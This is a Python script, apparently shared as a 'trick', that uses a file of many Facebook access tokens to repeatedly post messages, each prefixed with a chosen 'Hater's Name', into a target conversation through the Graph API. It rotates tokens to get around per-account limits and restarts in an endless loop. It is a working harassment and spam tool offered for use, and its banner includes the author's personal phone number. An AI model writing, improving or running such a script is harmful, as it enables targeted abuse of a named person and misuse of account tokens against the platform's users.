import requests
import json
import time
import sys
from platform import system
import os
import threading

BOLD = '\033[1m'
CYAN = '\033[96m'


def banner():  # Program Banner
    print(' \n\n   \033[1;31m███████╗ █████╗ ████████╗██╗███████╗██╗  ██╗\n   \033[1;32m██╔════╝██╔══██╗╚══██╔══╝██║██╔════╝██║  ██║\n   \033[1;33m███████╗███████║   ██║   ██║███████╗███████║\n   \033[1;34m╚════██║██╔══██║   ██║   ██║╚════██║██╔══██║\n   \033[1;35m███████║██║  ██║   ██║   ██║███████║██║  ██║\n   \033[1;36m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝╚═╝  ╚═╝\n\n\n      ╔═════════════════════════════════╗\n      ║  Author : Tricks By Satish      ║\n      ║  Wattsapp : +916268781574       ║\n      ╚═════════════════════════════════╝\n')

def get_access_tokens(token_file):
    with open(token_file, 'r') as file:
        return [token.strip() for token in file]
        

def liness():
	print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')

def send_messages(convo_id, tokens, messages, haters_name, speed):
    headers = {
        'Content-type': 'application/json',
    }

    num_tokens = len(tokens)
    num_messages = len(messages)
    max_tokens = min(num_tokens, num_messages)

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index]

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v15.0/{convo_id}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("\033[1;36m[✓] Ham Bhai Chla Gya Tera Massage {} of Convo {} sent by Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print("\033[1;35m[x] Failed to send message {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")

        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def main():
    banner()  # Print the banner before getting user input
    token_file = input(BOLD + CYAN + "[+] Token File: ").strip()
    tokens = get_access_tokens(token_file)

    convo_id = input(BOLD + CYAN + "[+] Conversation ID: ").strip()
    messages_file = input(BOLD + CYAN + "[+] Messages Text File: ").strip()
    haters_name = input(BOLD + CYAN + "[+] Hater's Name: ").strip()
    speed = int(input(BOLD + CYAN + "[+] Speed in Seconds: ").strip())

    with open(messages_file, 'r') as file:
        messages = file.readlines()


    send_messages(convo_id, tokens, messages, haters_name, speed)


if __name__ == '__main__':
    main()
